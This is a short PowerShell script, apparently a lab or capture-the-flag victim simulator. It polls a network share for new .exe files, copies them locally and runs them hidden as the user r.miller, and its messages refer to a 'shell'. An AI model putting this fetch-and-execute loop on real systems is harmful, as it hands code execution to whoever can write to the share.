# RUN THIS AS r.miller
$RemoteShare = "\\SVR1\Exchange"
$LocalDest = "C:\Users\r.miller.FYP\Downloads" 

Write-Host "--- Monitoring $RemoteShare as r.miller ---" -ForegroundColor Cyan

while($true) {
    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Checking for new files..." -ForegroundColor Gray
    
    $NewFiles = Get-ChildItem -Path $RemoteShare -Filter "*.exe" | Where-Object { 
        $_.LastWriteTime -gt (Get-Date).AddMinutes(-0.5) 
    }

    if ($NewFiles) {
        foreach ($File in $NewFiles) {
            $TargetFile = Join-Path $LocalDest $File.Name
            
            # Check if already running to prevent the "File in use" error
            if (!(Get-Process | Where-Object { $_.Path -like "*$($File.Name)*" })) {
                Write-Host "[!] Found: $($File.Name). Downloading for r.miller..." -ForegroundColor Yellow
                Copy-Item -Path $File.FullName -Destination $TargetFile -Force
                
                Write-Host "[!] Executing locally as r.miller..." -ForegroundColor Red
                Start-Process $TargetFile -WindowStyle Hidden
            } else {
                Write-Host "[*] Shell is already running. Monitoring for new files..." -ForegroundColor Green
            }
        }
    }
    Start-Sleep -Seconds 10
}